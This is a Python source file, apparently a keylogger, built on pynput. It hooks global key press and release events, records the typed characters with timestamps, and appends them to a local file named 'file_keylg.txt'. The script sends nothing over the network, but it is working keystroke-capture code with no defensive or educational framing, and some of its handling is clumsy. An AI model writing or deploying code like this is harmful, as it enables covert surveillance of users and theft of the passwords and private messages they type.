from pynput.keyboard import Key, Listener
import logging, time
import datetime
global data
global count
count = 0
data = ''
#log_dir = "" 

# logging.basicConfig(filename=(log_dir + "log_k.txt"), level=logging.DEBUG,format='%(asctime)s :%(message)s') 
# logging.basicConfig(filename=(log_dir + "log_k.txt"), level=logging.DEBUG,format='%(asctime)s :%(message)s') 
previus_time = 0
lst=[]

def save_data(data):
    with open('file_keylg.txt','at') as f:
        f.write(data+'\n')

def on_press(key):
    global lst
    if len(str(key)) > 3:
        a = str(key)+'pressed'
        lst.append(a)

def on_release(key):                                              
        global data,previus_time,lst
        settime =3.33
        if len(lst)>0:
            if 'pressed' in lst[0]:
                key = lst[0].strip('pressed')+' '+str(key)
                a,b =key.split(' ')
                if a==b:
                    key = a
                lst=[]
    
        if len(str(key)) <=3:
                data = data+str(key)[1] 
        elif len(str(key)) >3:
                if 'spac' in str(key) and len(data) != 0:
                        data = data+' '
                else:   
                        if (time.time()) > previus_time+settime:
                                print('--------------------------')
                                print('time:',(settime+time.time()),'previus_time',previus_time)
                                data = '-------------------------\n'+str(datetime.datetime.now()) +'\n--------------------------\n'+str(data)
                        data = str(data)+'\n__'+str(key)
                        save_data(data)
                        data = ''
                        previus_time = time.time()
with Listener(on_press=on_press,on_release=on_release) as listener:
        listener: listener.join()
